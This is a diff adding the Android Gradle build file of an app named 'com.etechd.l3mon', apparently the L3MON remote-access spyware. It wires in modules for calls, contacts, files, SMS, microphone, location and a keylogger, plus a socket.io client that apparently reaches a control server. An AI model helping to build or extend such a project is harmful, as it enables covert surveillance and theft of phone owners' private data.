@@ -1,0 +1,43 @@
+apply plugin: 'com.android.application'
+
+android {
+    compileSdkVersion 33
+    defaultConfig {
+        applicationId 'com.etechd.l3mon'
+        minSdkVersion 14
+        targetSdkVersion 28
+        versionCode 1
+        versionName "1.0"
+        multiDexEnabled = true
+    }
+    buildTypes {
+        release {
+            minifyEnabled false
+            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
+        }
+    }
+    namespace 'com.etechd.l3mon'
+}
+
+dependencies {
+    implementation fileTree(dir: 'libs', include: ['*.jar'])
+    implementation 'androidx.appcompat:appcompat:1.5.1'
+    implementation 'com.google.android.material:material:1.7.0'
+
+    implementation 'com.karumi:dexter:6.2.2'
+    implementation ('io.socket:socket.io-client:0.8.3') {
+        // excluding org.json which is provided by Android
+        exclude group: 'org.json', module: 'json'
+    }
+
+    implementation project(path: ':CommonInterfaces')
+    implementation project(path: ':CallsManager')
+    implementation project(path: ':ContactsManager')
+    implementation project(path: ':FileManager')
+    implementation project(path: ':SMSManager')
+    implementation project(path: ':MicManager')
+    implementation project(path: ':LocManager')
+    implementation project(':KeyLoggerManager')
+
+//    implementation "androidx.multidex:multidex:2.0.1"
+}
